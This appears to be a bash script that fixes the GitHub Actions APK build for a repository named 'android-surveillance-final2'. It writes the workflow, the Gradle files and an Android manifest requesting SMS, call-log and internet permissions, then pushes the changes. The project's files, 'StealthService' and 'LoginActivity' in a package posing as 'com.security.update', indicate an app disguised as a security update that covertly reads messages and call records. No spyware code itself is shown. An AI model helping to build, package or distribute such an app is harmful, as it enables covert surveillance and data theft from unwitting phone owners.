#!/bin/bash
cd ~/android-surveillance-final2

echo "🔧 FIXING GITHUB ACTIONS ISSUES"
echo "================================"

# 1. Angalia kama kuna mazingira yanayohitajika
echo ""
echo "1. 📋 CHECKING REQUIRED FILES:"
REQUIRED_FILES=(
    "app/src/main/AndroidManifest.xml"
    "app/src/main/java/com/security/update/LoginActivity.java"
    "app/src/main/java/com/security/update/StealthService.java"
    "app/build.gradle"
    "build.gradle"
    "settings.gradle"
)

for file in "${REQUIRED_FILES[@]}"; do
    if [ -f "$file" ]; then
        echo "✅ $file"
    else
        echo "❌ $file - MISSING!"
        # Create missing critical files
        if [ "$file" == "app/src/main/AndroidManifest.xml" ]; then
            mkdir -p app/src/main/
            cat > "$file" << 'MANIFEST'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <application>
        <activity android:name=".LoginActivity" />
    </application>
</manifest>
MANIFEST
        fi
    fi
done

# 2. Rekebisha GitHub workflow kwa njia sahihi
echo ""
echo "2. 🔄 FIXING GITHUB WORKFLOW:"
cat > .github/workflows/definite_build.yml << 'DEFINITE_WORKFLOW'
name: Definite APK Build

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      
    - name: Setup Java
      uses: actions/setup-java@v4
      with:
        java-version: '17'
        distribution: 'temurin'
        
    - name: Setup Android
      uses: android-actions/setup-android@v3
      
    - name: Make gradlew executable
      run: chmod +x ./gradlew
      
    - name: Build with Gradle
      run: |
        ./gradlew clean
        ./gradlew assembleDebug --no-daemon --stacktrace
        
    - name: Find and List APK files
      run: |
        echo "🔍 Searching for APK files..."
        find . -name "*.apk" -type f
        echo "📁 Checking build outputs..."
        ls -la app/build/outputs/ || echo "No outputs dir"
        ls -la app/build/outputs/apk/ || echo "No apk dir"
        ls -la app/build/outputs/apk/debug/ || echo "No debug dir"
        
    - name: Upload APK Artifact
      uses: actions/upload-artifact@v4
      with:
        name: android-app
        path: |
          app/build/outputs/apk/**/*.apk
          *.apk
        if-no-files-found: error
        retention-days: 90
        
    - name: Build Success
      if: success()
      run: |
        echo "🎉 APK BUILD SUCCESSFUL!"
        echo "📱 Download from Artifacts section"
DEFINITE_WORKFLOW

# 3. Hakikisha Gradle configuration ni sahihi
echo ""
echo "3. ⚙️  VERIFYING GRADLE CONFIG:"
cat > build.gradle << 'PROJECT_GRADLE'
buildscript {
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:8.0.0'
    }
}

allprojects {
    repositories {
        google()
        mavenCentral()
    }
}

task clean(type: Delete) {
    delete rootProject.buildDir
}
PROJECT_GRADLE

cat > app/build.gradle << 'APP_GRADLE'
plugins {
    id 'com.android.application'
}

android {
    namespace 'com.security.update'
    compileSdk 33

    defaultConfig {
        applicationId "com.security.update"
        minSdk 21
        targetSdk 33
        versionCode 1
        versionName "1.0"
    }

    buildTypes {
        debug {
            debuggable true
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
}
APP_GRADLE

echo ""
echo "4. 📤 PUSHING FIXES TO GITHUB:"
git add .
git commit -m "🔧 Fix GitHub Actions build issues
- Fixed workflow with proper APK path
- Ensured all required files exist
- Simplified Gradle configuration"
git push origin main

echo ""
echo "✅ ALL FIXES APPLIED!"
echo "🚀 NOW GO TO: https://github.com/CronosKIng/android-surveillance-final2/actions"
echo "   and run 'Definite APK Build' workflow"
echo "📱 APK will definitely be in Artifacts!"
